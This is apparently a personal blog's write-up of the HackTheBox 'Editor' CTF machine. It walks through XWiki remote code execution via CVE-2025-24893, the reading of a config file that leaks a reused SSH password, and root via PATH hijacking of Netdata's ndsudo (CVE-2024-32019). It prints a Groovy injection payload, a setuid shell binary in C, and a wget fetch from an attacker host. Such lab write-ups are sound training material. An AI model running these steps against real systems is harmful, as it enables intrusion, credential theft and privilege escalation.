---
layout: post
title: Editor
date:   2025-11-10 11:05
description: HacktheBox Editor CTF Write-Up
tags: hackthebox
comments: false
---
-HACKTHEBOX CTF WRITEUP-
[Link To CTF]()
<br>
<br>
<br>
## We start with an Nmap Scan
## We can see:
![img]({{ '/assets/images/editor/1-edit.png' | relative_url }}){: .center-image }


## We can open the site up on port 8080
![img]({{ '/assets/images/editor/2-edit.png' | relative_url }}){: .center-image }
<br>

## Here we see a webpage for developers, built with python (xwiki)
## Searching for vulnerabilities we can see the following:
{% highlight bash %}
[github.com/xwiki/xwiki-platform/security](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rj7p-xjv7-7229)

"XWiki is vulnerable to a remote code execution (RCE) attack through its user registration feature. This issue allows an attacker to execute arbitrary code by crafting malicious payloads in the "first name" or "last name" fields during user registration. This impacts all installations that have user registration enabled for guests.

To reproduce, register with any username and password and the following payload as "first name": ]]{{/html}}{{async}}{{groovy}}services.logging.getLogger("attacker").error("Attack succeeded){{/groovy}}{{/async}}. In the following page that confirms the success of the registration, the full first name should be displayed, linking to the created user. If the formatting is broken and a log message with content "ERROR attacker - Attack succeeded!" is logged, the attack succeeded "
{% endhighlight bash %}
<br>

## After searching multiple xwiki exploits these two work for our purposes
[github.com/CMassa/CVE-2025-24893](https://github.com/CMassa/CVE-2025-24893/blob/main/CVE-2025-24893.py)
## and
[github.com/Infinit3i/CVE-2025-24893](https://github.com/Infinit3i/CVE-2025-24893/blob/main/CVE-2025-24893-PoC.py)
<br>

## We now get RCE on the target

{% highlight bash %}
python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'ls'
{% endhighlight bash %}
![img]({{ '/assets/images/editor/3-edit.png' | relative_url }}){: .center-image }

{% highlight bash %}
python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'ls ../../../../../../home/'  
{% endhighlight bash %}
![img]({{ '/assets/images/editor/4-edit.png' | relative_url }}){: .center-image }
<br>

## We can see the user 'oliver' in the home directory
## Brute forcing the username for ssh access failed
## Lets look around for credentials or clues


{% highlight bash %}
python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'ls -al /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml'    
{% endhighlight bash %}
![img]({{ '/assets/images/editor/5-edit.png' | relative_url }}){: .center-image } 


## This shows a redirect path to:
{% highlight bash %}
python3 CVE-2025-24893.py -t http://10.10.11.80:8080 --command 'cat /etc/xwiki/hibernate.cfg.xml'  
{% endhighlight bash %}
![img]({{ '/assets/images/editor/6-edit.png' | relative_url }}){: .center-image }
<br>

## We can now see password credentials:

<span class="hoverblur">
Username:  oliver                                                                                                                                                                     
Password:  theEd1t0rTeam99
</span>
<br>

## Testing this password with the user Oliver we Get SSH access !
<br>

## We now can capture the user flag
![img]({{ '/assets/images/editor/7-edit.png' | relative_url }}){: .center-image }
<br>
<br>
<br>

## Priv esc 
<br>
<br>

## Running 'id' showed netdata
![img]({{ '/assets/images/editor/8-edit.png' | relative_url }}){: .center-image }
## Googling for exploits we will find CVE-2024-32019
<br>

## Essentially netdata includes 'ndsudo' which has the suid bit set
## This will run commands such as 'nvme'
## This is vulnerability to a PATH exploit if you call the command it is running first
<br>

## Running a command to search for biniaries with the suid bit set we can also see ndsudo:
{% highlight bash %}
find / -type f -perm -04000 -ls 2>/dev/null
{% endhighlight bash %}
![img]({{ '/assets/images/editor/9-edit.png' | relative_url }}){: .center-image }


## More details:
---------------
{% highlight bash %}
link: [github.com/netdata/...](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)

The ndsudo tool shipped with affected versions of the Netdata Agent allows an attacker to run arbitrary programs with root permissions.
Details

The ndsudo tool is packaged as a root-owned executable with the SUID bit set.
It only runs a restricted set of external commands, but its search paths are supplied by the PATH environment variable. This allows an attacker to control where ndsudo looks for these commands, which may be a path the attacker has write access to.
PoC

As a user that has permission to run ndsudo:
Place an executable with a name that is on ndsudo’s list of commands (e.g. nvme) in a writable path
Set the PATH environment variable so that it contains this path
Run ndsudo with a command that will run the aforementioned executable

Impact:  Local privilege escalation.
{% endhighlight bash %}
--------------
<br>

## Running string on the file:
## We see that nvme is listed as a command that can be called
{% highlight bash %}
strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
{% endhighlight bash %}

![img]({{ '/assets/images/editor/10-edit.png' | relative_url }}){: .center-image }
<br>

## We will replace NVME in the tmp directory
## Then modify the PATH variable to call our script first
<br>

## First we will write a C script to spawn a shell on our machine:
{% highlight bash %}
nano shell.c  

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
{% endhighlight bash %}


## Then compile:
{% highlight bash %}
>gcc C_shell.c -o nvme
{% endhighlight bash %}

## Now start a web server to host the file:
{% highlight bash %}
python3 -m http.server <port>
{% endhighlight bash %}


## On the target machine:
{% highlight bash %}
cd /tmp
wget http://attacker_IP:port/nvme
chmod +x nvme
export PATH=/tmp:$PATH
{% endhighlight bash %}

## Now we can add "nvme-list" to the original command to run nvme:
{% highlight bash %}
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
{% endhighlight bash %}

![img]({{ '/assets/images/editor/11-edit.png' | relative_url }}){: .center-image }

## We now get Root and PWN the machine


## This machine demonstrated how to gain initial access through CVE-2025-24893 in XWiki 15.10.8 and escalate privileges using CVE-2024-32019 in Netdata's ndsudo plugin





